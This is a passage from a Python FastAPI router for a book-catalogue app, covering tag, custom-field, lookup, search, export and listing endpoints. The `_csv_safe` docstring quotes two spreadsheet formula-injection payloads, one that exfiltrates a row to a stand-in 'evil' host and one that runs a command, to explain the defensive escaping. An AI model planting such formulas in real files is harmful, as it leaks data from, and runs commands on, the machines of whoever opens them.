import asyncio
import csv
import io
import logging
from collections.abc import Callable
from concurrent.futures import ThreadPoolExecutor
from datetime import UTC, date, datetime
from typing import Annotated, Any, Final

from fastapi import APIRouter, Depends, File, HTTPException, Query, UploadFile, status
from fastapi.responses import StreamingResponse
from pydantic import ValidationError
from sqlalchemy import func, nullslast
from sqlalchemy.orm import Session, joinedload

import authority
import catalogue
import covers
import custom_fields
import ddc
import google_books
import isbn as isbn_utils
import marc
import metadata
import settings_store
from auth import require_admin
from authors import AUTHOR_NAME_MAX
from authorship import (
    AuthorNotFound,
    Authorship,
    IdentifierConflict,
    RecordedAssertions,
)
from classifications import add_headings, bounded_headings, clipped
from config import COVERS_DIR
from dependencies import (
    BookForOwner,
    BookForRead,
    BookForWrite,
    BookInTrash,
    CurrentUser,
    DbSession,
    DivisionList,
    HeadingList,
    Paging,
    RowId,
    TagIdList,
    row_ids,
)
from dependencies import divisions as parse_divisions
from dependencies import headings as parse_headings
from enums import (
    AuthorityScheme,
    BookFormat,
    BookSort,
    BulkAction,
    ClassificationScheme,
    ExportFormat,
    LendingWillingness,
    Locale,
    OwnershipStatus,
    ReadStatus,
    SettingKey,
    TagCategory,
)
from importing import identity_key
from models import (
    AUTHOR_KEY_MAX,
    AuthorIdentifier,
    Book,
    Classification,
    Collection,
    CustomField,
    Loan,
    Note,
    Quote,
    ReadingProgress,
    Tag,
    User,
    book_tags,
    copy_group_token,
)
from ratelimit import authority_limiter, cover_backfill_limiter, metadata_limiter
from reading import Reading, resolve_merge
from schemas import (
    MAX_CLASSIFICATIONS_PER_BOOK,
    MAX_ROW_ID,
    AuthorIdentifierOut,
    AuthorIdentifierRequest,
    AuthorityCandidateOut,
    AuthorityDisagreementOut,
    AuthorMergeRequest,
    AuthorOut,
    AuthorSuggestionOut,
    AuthorWikipediaOut,
    BookCreate,
    BookDetailsUpdate,
    BookDiscussUpdate,
    BookEnrichmentOut,
    BookLookup,
    BookMatch,
    BookOut,
    BookRatingUpdate,
    BookStatusUpdate,
    BulkRequest,
    BulkResult,
    ClassificationFacets,
    CollectionAssign,
    ConfirmedIdentifierOut,
    CopyCreate,
    CoverBackfillOut,
    CustomFieldCreate,
    CustomFieldOut,
    CustomFieldRename,
    CustomFieldValueOut,
    CustomFieldValueUpdate,
    DivisionFacetOut,
    DuplicateGroup,
    HeadingFacetOut,
    LocationOut,
    MergeRequest,
    NoteCreate,
    NoteOut,
    OwnershipUpdate,
    Page,
    PrivacyUpdate,
    ProgressCreate,
    ProgressOut,
    PurgeResult,
    QuoteCreate,
    QuoteOut,
    QuoteWithBookOut,
    RefusedAssertionOut,
    SeriesOut,
    TagCreate,
    TagOut,
)
from serialisation import book_to_out, books_to_out, suggested_tag_ids
from shelf import (
    BookFilters,
    Loading,
    Shelf,
    order_for,
    whole_table_for_uniqueness,
)
from uploads import read_image_upload, replace_image

logger = logging.getLogger("endpaper.books")

router = APIRouter(prefix="/api/books", tags=["books"])


# ── Tags and lookup ───────────────────────────────────────────────────────────


@router.get("/tags", response_model=list[TagOut])
def list_tags(db: DbSession, current_user: CurrentUser) -> list[TagOut]:
    """The curated vocabulary plus whatever the library has invented.

    The **client** decides the order the groups appear in (`TAG_CATEGORY_ORDER`
    in the frontend), because that is a presentation decision and it needs the
    same order in three places. This orders by name within the group so the
    response is deterministic. The order a reader sees is the client's too:
    `frontend/src/lib/nameOrder.ts` re-sorts with a collator, because no SQL
    fold moves `Ä`.

    `book_count` is one grouped query for the whole list rather than one per
    tag: this is fetched on nearly every page, so an N+1 here is an N+1
    everywhere.
    """
    # Joined to Book and filtered, like every other query that counts books.
    # Without it the count included other members' **private** books and
    # trashed ones, and this endpoint is fetched on nearly every page, so a
    # member could watch somebody else's private additions accrue in a number
    # their own listing said was zero.
    counts = dict(
        Shelf.seen_by(db, current_user.id)
        .select(book_tags.c.tag_id, func.count(book_tags.c.book_id))
        .join(book_tags, book_tags.c.book_id == Book.id)
        .group_by(book_tags.c.tag_id)
        .all()
    )
    return [
        TagOut(
            id=tag.id,
            name=tag.name,
            category=TagCategory(tag.category),
            # Straight off the row: `KnownTagKey` forgets a key this version
            # has never heard of, so one costs that tag its translation rather
            # than 500ing a list drawn on nearly every page.
            key=tag.key,
            is_predefined=tag.is_predefined,
            book_count=counts.get(tag.id, 0),
        )
        for tag in db.query(Tag).order_by(Tag.category, Tag.name).all()
    ]


@router.post("/tags", response_model=TagOut, status_code=status.HTTP_201_CREATED)
def create_tag(payload: TagCreate, db: DbSession, current_user: CurrentUser) -> Tag:
    """Invent a tag.

    Any member, not just an admin. Public books are a shared shelf that anyone
    may curate, and a vocabulary only an admin can extend is a vocabulary
    nobody uses.

    Matched case-insensitively against what already exists, so "Cookbooks" and
    "cookbooks" cannot both appear. A collision returns the existing tag rather
    than a 409: somebody typing a name that is already there wants that tag,
    and an error would send them to find it by hand.
    """
    # **Folded in Python on both sides, never `func.lower` against `.lower()`.**
    # Those are two different functions: SQLite's `lower()` is ASCII only, so
    # `lower('Ästhetik')` is `'Ästhetik'` there and `'ästhetik'` here. A stored
    # tag with a non-ASCII capital therefore never matched, and the insert then
    # hit the binary `unique=True` on `tags.name` with a name already present:
    # measured, this route answered **500** to `{"name": "Ästhetik"}` whenever
    # that tag existed. See `docs/decisions.md`, "SQLite folds case in ASCII
    # and Python does not".
    #
    # One query and a scan rather than a filtered lookup, because the tags are
    # a library's curated list plus what imports invented, and correctness here
    # is worth more than the index. `importing.Import._tags_by_folded_name`
    # does the same thing for the same reason.
    folded = payload.name.lower()
    existing = next(
        (tag for tag in db.query(Tag).order_by(Tag.id).all() if tag.name.lower() == folded),
        None,
    )
    if existing is not None:
        return existing

    tag = Tag(name=payload.name, category=TagCategory.CUSTOM, is_predefined=False)
    db.add(tag)
    db.commit()
    db.refresh(tag)
    return tag


@router.delete("/tags/{tag_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_tag(
    tag_id: RowId,
    db: DbSession,
    current_user: Annotated[User, Depends(require_admin)],
) -> None:
    """Remove a tag the library invented, and take it off every book.

    **Admin only, and deliberately asymmetric with creating one.** Creating a
    tag is additive and reversible by deleting it, so it is open to everyone.
    Deleting one is neither: it strips the tag from every book in the house at
    once, there is no undo for it as there is for a deleted book, and `Tag`
    records nobody as its author. One member should not be able to quietly
    unpick the shared vocabulary.

    A seeded tag is refused rather than deleted. `seed_tags()` runs at every
    boot and would put it straight back, so the delete would appear to work
    and then quietly undo itself at the next restart.

    Declared before `/{book_id}`: two segments, but the ordering is what keeps
    that true if either path is later reshaped.
    """
    tag = db.get(Tag, tag_id)
    if tag is None:
        raise HTTPException(status_code=404, detail="Tag not found")
    if tag.is_predefined:
        raise HTTPException(
            status_code=400,
            detail="That tag is part of the built-in list and cannot be removed.",
        )

    # The association rows go with it. `book_tags` has ON DELETE CASCADE, but
    # SQLite only enforces foreign keys when the pragma is on, so the rows are
    # cleared here rather than trusted to the database.
    db.execute(book_tags.delete().where(book_tags.c.tag_id == tag_id))
    db.delete(tag)
    db.commit()


# ── Custom fields ─────────────────────────────────────────────────────────────
#
# The Library's own facts about a Book, defined once here and filled in per Book
# at `/{book_id}/custom-fields` further down. Declared **before** `/{book_id}`,
# like the tag routes above and for the same reason: FastAPI matches in
# declaration order, and reversing them makes the first of these a request for
# the book with id "custom-fields".
#
# Under `/api/books` rather than under `/api/settings`, because that is where
# `/tags` already is and this is the same kind of thing: a Library wide
# vocabulary that only means anything on a Book.


def _custom_field(field_id: int, db: Session) -> CustomField:
    """The definition at this id, or a 404.

    Not a privacy question: a definition is Library wide, exactly like a Tag,
    and says nothing about any Book. The 404 is only for an id that is not one.
    """
    field = db.get(CustomField, field_id)
    if field is None:
        raise HTTPException(status_code=404, detail="Custom field not found")
    return field


@router.get("/custom-fields", response_model=list[CustomFieldOut])
def list_custom_fields(db: DbSession, current_user: CurrentUser) -> list[CustomField]:
    """Every field this library keeps, in the order it defined them.

    **No usage count**, unlike `GET /api/books/tags`. A count of the books
    carrying a field is a disclosure: it is drawn from books the caller may not
    see, so it would have to be scoped to the viewer, and a viewer scoped
    number in a confirmation dialog would then understate what deleting the
    field is about to destroy. Neither number is worth having, so the
    confirmation says "every book" instead. `docs/security.md` records it.
    """
    return custom_fields.definitions(db)


@router.post("/custom-fields", response_model=CustomFieldOut, status_code=status.HTTP_201_CREATED)
def define_custom_field(
    payload: CustomFieldCreate, db: DbSession, current_user: CurrentUser
) -> CustomField:
    """Define a field for the whole library.

    Any member, like `create_tag` and for the same reason: public books are a
    shared shelf that anyone may curate, and a vocabulary only an admin can
    extend is a vocabulary nobody uses. Defining one is additive and changes no
    book.

    A name that already exists, in any capitalisation, returns that field
    rather than a 409: somebody typing a name that is already there wants that
    field. Past `MAX_CUSTOM_FIELDS` it refuses with 409.
    """
    try:
        field = custom_fields.define(db, payload.name, payload.kind)
    except custom_fields.Refused as refusal:
        raise HTTPException(status_code=409, detail=str(refusal)) from refusal
    db.commit()
    db.refresh(field)
    return field


@router.patch("/custom-fields/{field_id}", response_model=CustomFieldOut)
def rename_custom_field(
    field_id: RowId,
    payload: CustomFieldRename,
    db: DbSession,
    current_user: CurrentUser,
) -> CustomField:
    """Rename a field. Every value under it is kept.

    That is the schema rather than this handler: values reference the
    definition by id, so nothing about them mentions the name. `custom_fields.rename`
    records why renaming onto an existing name is refused instead of merged.
    """
    field = _custom_field(field_id, db)
    try:
        custom_fields.rename(db, field, payload.name)
    except custom_fields.Refused as refusal:
        raise HTTPException(status_code=409, detail=str(refusal)) from refusal
    db.commit()
    db.refresh(field)
    return field


@router.delete("/custom-fields/{field_id}", status_code=status.HTTP_204_NO_CONTENT)
def delete_custom_field(
    field_id: RowId,
    db: DbSession,
    current_user: Annotated[User, Depends(require_admin)],
) -> None:
    """Remove a field, and its value on every book.

    **Admin only, and deliberately asymmetric with defining one**, which is the
    same split `delete_tag` makes. Defining a field is additive and reversible
    by deleting it. Deleting one destroys, in one request and with no undo,
    something every member of the house typed by hand, on books the caller
    cannot necessarily see. A `CustomField` records nobody as its author, so
    there is no owner to ask.

    It is the sharper case of the two: deleting a tag takes a label off a book,
    and deleting a field takes the **content** a member wrote.

    204, like `delete_tag`, and the number of values removed goes to the log
    rather than to the caller. See `list_custom_fields` for why no count is
    published.
    """
    field = _custom_field(field_id, db)
    name = field.name
    removed = custom_fields.remove(db, field)
    db.commit()
    logger.info("Deleted custom field %r and %d value(s) under it", name, removed)


@router.get("/lookup", response_model=BookLookup)
async def lookup_isbn(
    db: DbSession,
    current_user: CurrentUser,
    isbn: Annotated[str, Query(min_length=10, max_length=20)],
) -> BookLookup:
    # Validated before either upstream is called: a misread barcode would
    # otherwise cost two network round trips to learn nothing.
    metadata_limiter.check(current_user.username)
    canonical = isbn_utils.parse(isbn)
    if canonical is None:
        raise HTTPException(
            status_code=422,
            detail="Not a valid ISBN. Check the digits and try again.",
        )

    # The key is passed whatever the library's provider list says, because the
    # plan is what decides whether Google is asked at all: with its section
    # switched off or no key in force, `settings_store.catalogue_sources` has
    # already dropped it. Passing the key was once the whole fix for a fallback
    # that failed by omitting it, and it stays for that reason.
    result = await metadata.lookup(
        canonical,
        settings_store.google_books_api_key(db),
        plan=settings_store.catalogue_sources(db),
    )
    if not result.found:
        raise HTTPException(**_lookup_failure(result))

    assert result.record is not None
    record = result.record
    # Built here rather than left to the schema so the same objects feed the tag
    # suggestion and the response, and the two cannot disagree about what the
    # catalogues said.
    classifications = bounded_headings(record.headings)
    all_tags = db.query(Tag).all()
    return BookLookup(
        **record.as_lookup(),
        classifications=classifications,
        suggested_tag_ids=suggested_tag_ids(
            list(record.subjects), classifications, all_tags
        ),
    )


def _match_rows(
    matches: list[catalogue.Record], all_tags: list[Tag] | None
) -> list[BookMatch]:
    """Catalogue records as search rows, dropping any the schema refuses.

    **The only place a `BookMatch` is built from third party data**, and that
    is the point of the function rather than a description of it. The two
    endpoints that answer with one diverged: this guard lived inside the search
    handler, and `GET /{book_id}/enrich/candidates` built the model in a bare
    list comprehension off the same `metadata.search`. There is no
    `ValidationError` handler in `main.py`, so one record the schema refused
    answered **500 for the whole response** there, where the same record cost
    one row here. A third endpoint answering with matches now inherits the
    guard instead of the hole.

    **One bad record costs one result, not the response.** `BookMatch` is a
    bounded model built straight from third party data, and a single record
    tripping any bound would throw away every other row on the page. Reachable
    without any classification: `year` comes from a four digit match against
    `MAX_YEAR` 2200, and 9999 is MARC's own open ended date for a continuing
    resource.

    **`bounded_headings` is still called here although `Record.match_headings` bounds
    the count**, and the two are not the same job. That bound stops a ninth
    heading; this drops an entry the column could not hold, so a 400 character
    caption costs its own heading rather than the row. What it no longer does
    on this path is the count: `match_headings` has already sliced, so on the
    search path the parser's own order decides what survives and not
    `classifications.SCHEME_ORDER`.
    Two parsers now have to keep that true, not one. `_dnb_record` emits its
    Dewey number ahead of its GND headings, and `_loc_record` emits its
    `<classification>` elements ahead of its LCSH ones, which is where the
    slice actually bites: a live Library of Congress record carries up to 14
    subject headings against at most two classifications. This is the sentence
    that goes wrong first if a third parser emits a subject vocabulary ahead of
    a shelf one. The sort still decides for a merged book, which is where
    several catalogues meet.

    `all_tags` is None where the caller already has a book. The enrichment
    candidates are other editions of a book that exists, so a tag suggestion
    there answers a question nobody asked, and `BookMatch.suggested_tag_ids`
    documents that it is left empty.
    """
    rows: list[BookMatch] = []
    for match in matches:
        try:
            row = BookMatch(
                **match.as_match(),
                classifications=bounded_headings(match.match_headings()),
            )
        except ValidationError:
            logger.info(
                "Discarded an unusable search result from %r: %s",
                match.source,
                clipped(match),
            )
            continue
        # The record's own subjects rather than the joined string it puts on the
        # wire: splitting `categories` back apart to feed this was a round trip
        # through a separator, and the classifications come off the validated
        # model so the bounds and the tidying are not run twice.
        if all_tags is not None:
            row.suggested_tag_ids = suggested_tag_ids(
                list(match.subjects), row.classifications, all_tags
            )
        rows.append(row)
    return rows


def _lookup_failure(result: metadata.Lookup) -> dict[str, Any]:
    """Turn a failed lookup into the status and wording it deserves.

    All three used to be "Book not found for this ISBN", which sends someone to
    type a book in by hand when the honest answer is that a quota will reset in
    a few minutes. 503 rather than 404 for the two transient cases, so the
    client can offer "try again" instead of "add it manually".

    The fourth is `NO_SOURCES`, where nothing was asked at all because the
    library has switched off every catalogue that answers an ISBN. That is the
    same mistake one step further on: a 404 there reports a fact about the book
    from an app that asked nobody.
    """
    if result.outcome is metadata.Outcome.RATE_LIMITED:
        return {
            "status_code": status.HTTP_503_SERVICE_UNAVAILABLE,
            "detail": (
                "The book catalogues are rate limiting us right now. Wait a minute "
                "and scan again, or add the book by hand."
            ),
        }
    if result.outcome is metadata.Outcome.UNAVAILABLE:
        return {
            "status_code": status.HTTP_503_SERVICE_UNAVAILABLE,
            "detail": (
                "Could not reach the book catalogues. Check the connection, or add "
                "the book by hand."
            ),
        }
    if result.outcome is metadata.Outcome.NO_SOURCES:
        return _no_sources()
    return {
        "status_code": status.HTTP_404_NOT_FOUND,
        "detail": "No catalogue has a record for this ISBN.",
    }


def _no_sources() -> dict[str, Any]:
    """Nothing was asked, because nothing capable is switched on.

    **409 rather than 404**, and it is the one refusal here that is about this
    library rather than about the book: nothing is wrong with the ISBN or the
    query, and a 404 would be the app reporting a fact it never checked. The
    sentence names the screen that fixes it, because the library did this to
    itself and can undo it in one click.

    Shared by three routes rather than written three times. The lookup path
    reaches it through `_lookup_failure`, which has a `Lookup` to read the
    outcome off; the two search paths have no `Lookup` and decide on the plan
    before they call out, so they call this directly.
    """
    return {
        "status_code": status.HTTP_409_CONFLICT,
        "detail": (
            "No catalogue is switched on that can look up an ISBN. Turn one "
            "back on under Settings, Catalogue sources."
        ),
    }


@router.get("/search", response_model=list[BookMatch])
async def search_books(
    db: DbSession,
    current_user: CurrentUser,
    q: Annotated[str, Query(min_length=2, max_length=200, description="Title, author or both")],
    limit: Annotated[int, Query(ge=1, le=20)] = 10,
    lang: Annotated[
        Locale | None,
        Query(description="Prefer editions in this language when ranking"),
    ] = None,
) -> list[BookMatch]:
    """Free-text search, for adding a book nobody can scan.

    The barcode path covers a book that is physically to hand. This covers the
    rest: a book with no barcode, a damaged one, one printed before ISBNs
    existed, or one being added from a list rather than from the shelf. The
    caller picks a result and the client prefills the form from it, so nothing
    is written until a person confirms.

    **No API key is required.** This used to be Google Books only and was
    hidden entirely from a library that had not configured one, which left
    them with no way at all to add a book by title. Open Library answers
    without a key; Google is merged in on top when one is set, for the blurb
    and the categories its search index carries and Open Library's does not.

    Two segments (`/google/search`) used to guard against this being confused
    with `/{book_id}`; a single one is safe for the same reason `/export` is,
    which is that it is declared first.
    """
    api_key = ""
    if settings_store.get_bool(db, SettingKey.GOOGLE_BOOKS_ENABLED):
        # The resolved key, so an environment-supplied one counts. Absent is
        # not an error here: it costs the Google half of the results, not the
        # search.
        api_key = settings_store.google_books_api_key(db)

    metadata_limiter.check(current_user.username)
    # The reader's own language, so a German library searching a German
    # title gets the German printing first. It breaks ties only: an English
    # title still returns the English book.
    plan = settings_store.catalogue_sources(db)
    # A library that has switched every catalogue off is told so, rather than
    # handed an empty result page that reads as "no such book". Same refusal a
    # lookup gets, decided here because a search has no `Lookup` to carry it.
    if not plan.searched:
        raise HTTPException(**_no_sources())

    matches = await metadata.search(
        q, api_key, limit=limit, prefer_language=lang, plan=plan
    )

    return _match_rows(matches, db.query(Tag).all())


# ── Export ────────────────────────────────────────────────────────────────────
#
# Declared before /{book_id}: FastAPI matches in declaration order, so the
# reverse order would make this a request for the book with id "export".


#: The file extension each export format is saved under.
#:
#: `marcxml` is the value on the wire and `.xml` is what the file is called: a
#: cataloguer's tools open `.xml`, and `.marcxml` is an extension nothing is
#: registered for. Every other format is named after itself.
_EXPORT_EXTENSIONS: Final[dict[ExportFormat, str]] = {ExportFormat.MARCXML: "xml"}


@router.get("/export")
def export_books(
    db: DbSession,
    current_user: CurrentUser,
    format: Annotated[ExportFormat, Query()] = ExportFormat.CSV,
) -> StreamingResponse:
    """The shelf this member can see, as a file.

    **MARCXML needs library mode and the other two do not.** A CSV export is a
    household reading its own shelf in a spreadsheet. A MARC record is a
    catalogue record handed to another institution, which is what library mode
    is for, and offering it everywhere would put a format nobody in a household
    can use in front of everybody. Enforced here rather than by hiding the menu
    entry: disabling a control in the browser is advice to one client, which is
    the sentence `routers/public.py` already states about the public catalogue.

    **403, not 404.** The route exists and the member may call it; the format
    is switched off. That is the same answer registration gives when it is
    closed, and there is nothing to conceal: `GET /api/settings/features`
    already tells any caller whether library mode is on.
    """
    extension = _EXPORT_EXTENSIONS.get(format, format.value)
    filename = f"endpaper-export-{date.today().isoformat()}.{extension}"

    if format is ExportFormat.MARCXML:
        if not settings_store.library_mode(db):
            raise HTTPException(
                status_code=status.HTTP_403_FORBIDDEN,
                detail="MARC export is a library mode feature.",
            )
        # `Loading.PUBLISHED` rather than `EXPORTED`, and the name is about the
        # payload rather than the audience: it is the one option that eagerly
        # loads `classifications`, which is the half of a MARC record that
        # makes it worth exchanging, and it omits `added_by` and `collection`,
        # which are household facts a catalogue record does not carry. Reading
        # them lazily instead would be one statement per book.
        catalogued = Shelf.seen_by(db, current_user.id).all(
            Book.title.asc(), load=Loading.PUBLISHED
        )
        return StreamingResponse(
            iter([marc.write(catalogued)]),
            # The registered media type for MARCXML, per the Library of
            # Congress. A cataloguer's tools dispatch on it.
            media_type="application/marcxml+xml; charset=utf-8",
            headers={"Content-Disposition": f'attachment; filename="{filename}"'},
        )

    books = Shelf.seen_by(db, current_user.id).all(Book.title.asc(), load=Loading.EXPORTED)

    # Batched rather than queried per book, and empty costs no statement.
    # `status_of` is what applies "absence means unread", so the writer below
    # reads a value for every row rather than a default per cell.
    statuses = Reading.by(db, current_user.id).of([book.id for book in books])

    if format is ExportFormat.CSV:
        output = io.StringIO()
        writer = csv.writer(output)
        writer.writerow(
            [
                "Title", "Author", "ISBN", "Publisher", "Year",
                "Description", "Tags", "My Status", "Date Added", "Added By",
                "Format", "Condition", "Location", "Collection", "Purchase Price",
                "Purchase Currency", "Purchased On", "Purchased From",
            ]
        )
        for book in books:
            # Every member-supplied cell goes through `_csv_safe`. The numeric
            # and enum columns do not need it and are passed through it anyway,
            # so adding a column cannot accidentally skip the guard.
            writer.writerow(
                [
                    _csv_safe(book.title),
                    _csv_safe(book.author),
                    _csv_safe(book.isbn),
                    _csv_safe(book.publisher),
                    book.year if book.year is not None else "",
                    _csv_safe(book.description),
                    _csv_safe("; ".join(tag.name for tag in book.tags)),
                    statuses.status_of(book.id),
                    book.added_at.date().isoformat() if book.added_at else "",
                    _csv_safe(book.added_by.username if book.added_by else ""),
                    book.format or "",
                    book.condition or "",
                    _csv_safe(book.location),
                    # The name, not the id: an export is read by people, and a
                    # foreign key means nothing in a spreadsheet. Through
                    # `_csv_safe` like every other member-supplied cell,
                    # because a collection is named by a member.
                    _csv_safe(book.collection.name if book.collection else ""),
                    # Back to major units for the export. A spreadsheet column
                    # of cents is not what anybody means by "what did this
                    # cost", and an export is read by people, not by us.
                    _price_column(book.purchase_price_minor),
                    book.purchase_currency or "",
                    book.purchased_at.isoformat() if book.purchased_at else "",
                    _csv_safe(book.purchase_source),
                ]
            )
        content = output.getvalue()
        media_type = "text/csv; charset=utf-8"
    else:
        blocks: list[str] = []
        for book in books:
            blocks.append(
                "\n".join(
                    [
                        f"Title: {book.title or ''}",
                        f"Author: {book.author or ''}",
                        f"ISBN: {book.isbn or ''}",
                        f"Publisher: {book.publisher or ''}",
                        f"Year: {book.year if book.year is not None else ''}",
                        f"Tags: {'; '.join(tag.name for tag in book.tags)}",
                        f"My Status: {statuses.status_of(book.id)}",
                        f"Date Added: {book.added_at.date().isoformat() if book.added_at else ''}",
                        f"Added By: {book.added_by.username if book.added_by else ''}",
                        f"Description: {book.description or ''}",
                    ]
                )
            )
        content = "\n\n".join(blocks)
        media_type = "text/plain; charset=utf-8"

    return StreamingResponse(
        iter([content]),
        media_type=media_type,
        headers={"Content-Disposition": f'attachment; filename="{filename}"'},
    )


#: Characters that make a spreadsheet treat a cell as a formula rather than as
#: text. Tab and carriage return are here because Excel strips them and then
#: reads whatever follows, so a value beginning "\t=cmd..." executes too.
_FORMULA_LEAD: Final = ("=", "+", "-", "@", "\t", "\r")


def _csv_safe(value: object) -> str:
    """Neutralise a cell that a spreadsheet would run as a formula.

    Every text column of this export is member-supplied: titles, authors,
    publishers, descriptions, shelf locations and **tag names**. Tags are
    library wide, so a tag put on a public book reaches every other member's
    export. `=HYPERLINK("http://evil/?d="&A1,"ok")` in a title exfiltrates the
    row when an admin opens the file, and `=cmd|'/c calc'!A1` is the older
    trick. `csv.writer` quotes for CSV correctness and does nothing about this.

    A leading apostrophe is the conventional fix: Excel and LibreOffice both
    treat the cell as text and hide the character. It is applied only to values
    that would otherwise be executed, so an ordinary title is untouched.
    """
    text = "" if value is None else str(value)
    return f"'{text}" if text.startswith(_FORMULA_LEAD) else text


def _price_column(minor: int | None) -> str:
    """Cents back to a plain decimal string, for the export only.

    Two decimal places always, so a column of prices lines up and a
    spreadsheet reads them as numbers rather than as text.
    """
    return "" if minor is None else f"{minor / 100:.2f}"


# ── Listing ───────────────────────────────────────────────────────────────────

@router.get("", response_model=Page[BookOut])
def list_books(
    db: DbSession,
    current_user: CurrentUser,
    paging: Paging,
    q: Annotated[str | None, Query(max_length=200)] = None,
    status_filter: Annotated[ReadStatus | None, Query(alias="status")] = None,
    tags: TagIdList = None,
    ownership: Annotated[OwnershipStatus | None, Query()] = None,
    format: Annotated[BookFormat | None, Query()] = None,
    lending: Annotated[LendingWillingness | None, Query()] = None,
    series: Annotated[str | None, Query(max_length=255)] = None,
    author: Annotated[
        str | None,
        Query(
            max_length=AUTHOR_KEY_MAX,
            description="Only books credited to this author, by key or by any spelling",
        ),
    ] = None,
    location: Annotated[str | None, Query(max_length=120)] = None,
    collection_id: Annotated[
        int | None,
        Query(
            ge=1,
            # Bounded above for the reason `after_id` is, and this one has no
            # lower-bound-only escape: a Python int has no ceiling and SQLite's
            # does, so an id above 2**63-1 would reach the driver and raise
            # `OverflowError` from inside the query, answering 500 to a value
            # the caller chose.
            le=MAX_ROW_ID,
            description="Only books filed in this collection",
        ),
    ] = None,
    unfiled: Annotated[
        bool, Query(description="Only books in no collection at all")
    ] = False,
    unrated: Annotated[bool, Query(description="Only books you have not rated")] = False,
    discuss: Annotated[
        bool, Query(description="Only books somebody has offered to talk about")
    ] = False,
    classification: HeadingList = None,
    ddc_division: Annotated[DivisionList, Query(alias="ddc")] = None,
    sort: Annotated[BookSort, Query()] = BookSort.TITLE_ASC,
) -> Page[BookOut]:
    # Two parameters rather than a magic id for "none", and refused together
    # rather than one silently winning. "Books in collection 3" and "books in
    # no collection" are different questions, and a caller that asked both has
    # made a mistake worth being told about: picking one for them is how a
    # filter quietly shows the wrong shelf.
    #
    # Refused here rather than in `BookFilters`, because it is a fact about
    # this request and the answer is a 422 with a sentence in it. A filter
    # value object that raised HTTP exceptions would be a schema wearing a
    # router's hat.
    if collection_id is not None and unfiled:
        raise HTTPException(
            status_code=422,
            detail="Ask for one collection or for the unfiled books, not both.",
        )

    # The author name is resolved to ids **here**, not on the shelf: deciding
    # which spellings are one person needs the alias rows and the folding
    # rules, which is an identity question and belongs to `authorship.py`. See
    # `BookFilters.author_ids`.
    #
    # The resolution is bounded by the visible catalogue, because every id it
    # returns came out of a query that applied the predicate. Two extra
    # statements, and they are **per page rather than per request**: this runs
    # again for every page of a filtered listing, and each time it re-reads
    # every visible credit line and re-splits it. Measured in
    # `test_books_authors.py`.
    author_ids = (
        None
        if author is None
        else Authorship.seen_by(db, current_user.id).book_ids_for(author)
    )

    filters = BookFilters(
        q=q,
        status=status_filter,
        tag_ids=row_ids(tags, field="tags"),
        ownership=ownership,
        format=format,
        lending=lending,
        series=series,
        author_ids=author_ids,
        location=location,
        collection_id=collection_id,
        unfiled=unfiled,
        unrated=unrated,
        discuss=discuss,
        headings=parse_headings(classification),
        ddc_divisions=parse_divisions(ddc_division),
    )

    books, total = (
        Shelf.seen_by(db, current_user.id)
        .matching(filters)
        .page(paging.offset, paging.limit, *order_for(sort), load=Loading.SERIALISED)
    )

    return Page[BookOut](
        items=books_to_out(books, current_user, db),
        total=total,
        page=paging.page,
        page_size=paging.page_size,
    )


# ── Creating ──────────────────────────────────────────────────────────────────


def _store_cover(book: Book) -> bool:
    """Give this book the best cover available, held here where possible.

    True when something changed and the caller must commit.

    Every path that puts a book in the catalogue calls this, which is the point:
    the CSV import never resolved a cover at all, so a library that arrived by
    import showed the placeholder on every single book and no log line said why.

    Blocking, deliberately: see the note above `covers.download`. Bounded, too:
    without a ceiling a single add is up to three candidate checks and a
    download at `covers.TIMEOUT_SECONDS` each, which is 24 seconds of a spinner
    when both image services blackhole rather than refuse.
    """
    # Already held here: the URL points at this app and there is a file behind
    # it. The file test is not paranoia, it is what stops the column and the
    # directory drifting apart without anybody noticing.
    if covers.is_local(book.cover_url) and covers.stored_path(book.id) is not None:
        return False

    # Budgeted, because every caller of this is a request with a person waiting
    # at the end of it. The backfill does not come through here and passes none,
    # which bounds how many covers it fetches and **not** how long each one may
    # take: a trickled body is held to `MAX_COVER_BYTES` and the per read
    # timeout, and nothing else. That costs one threadpool worker and a stalled
    # backfill, and it needs a compromised host in `COVER_HOSTS`, all six of
    # which are https. `covers.resolve_and_store` carries the same note.
    resolved = covers.resolve_and_store(
        book.id, book.isbn, book.cover_url, budget=covers.INTERACTIVE_BUDGET_SECONDS
    )
    if resolved is None or resolved == book.cover_url:
        return False
    book.cover_url = resolved
    return True


def _checked_collection(db: Session, collection_id: int | None) -> int | None:
    """The id of a collection that exists, or None, or a 400.

    Every write that files a book goes through here. Without it an unknown id
    reaches the foreign key and surfaces as a 500 from inside an add, which
    tells the caller nothing about what they got wrong.

    A 400 rather than a 404: the request is about a book, and the thing that
    does not exist is a field in its body. It is also not a privacy question,
    because collections are library wide, so there is nothing here to withhold
    by answering vaguely.

    The range check is not redundant with the schemas that bound this field.
    `BulkRequest.value` is deliberately loose (`str | int | None`, because which
    field it fills depends on the verb), so the bulk verb parses an id out of it
    and arrives here having validated nothing. An id past SQLite's INTEGER
    raises `OverflowError` from inside `db.get`, which is a 500 rather than a
    refusal. See `MAX_ROW_ID`.
    """
    if collection_id is None:
        return None
    if not 1 <= collection_id <= MAX_ROW_ID:
        raise HTTPException(status_code=400, detail="No such collection")
    if db.get(Collection, collection_id) is None:
        raise HTTPException(status_code=400, detail="No such collection")
    return collection_id


def _create_book(payload: BookCreate, current_user: User, db: Session, conflict: str) -> BookOut:
    # payload.isbn is already canonical ISBN-13 (see BookCreate's validator),
    # but rows written before canonicalisation may hold the ISBN-10, so both
    # spellings are checked or the same book gets added twice.
    #
    # The ISBN walk below reads through `whole_table_for_uniqueness` rather
    # than a shelf: the ISBN is unique across the whole table, so a clash with
    # somebody else's private book is still a clash. That also means it sees
    # **trashed** rows, which is the trap soft deletion introduces and
    # `_freeable` exists to resolve.
    # Before the ISBN walk below, which purges trashed rows to free the number.
    # A bad collection id refused afterwards would have destroyed them first.
    _checked_collection(db, payload.collection_id)

    freed: list[int] = []
    if payload.isbn:
        forms = isbn_utils.equivalent_forms(payload.isbn)
        if forms:
            # `whole_table_for_uniqueness`, not a shelf: the ISBN is unique
            # across the whole table, invisible rows included, so a filtered
            # check would miss the row that is actually going to collide and
            # turn a 409 into a 500.
            #
            # **Every holder, not the first one.** Copies made it possible for
            # several rows to hold one ISBN, and freeing only the first was
            # wrong in two different ways, both measured through the API: a
            # trashed group of two answered **500** (`IntegrityError: UNIQUE
            # constraint failed: books.isbn`, because the survivor's token was
            # cleared as the group shrank and it re-entered the partial index
            # just as the insert reclaimed the ISBN), and a trashed group of
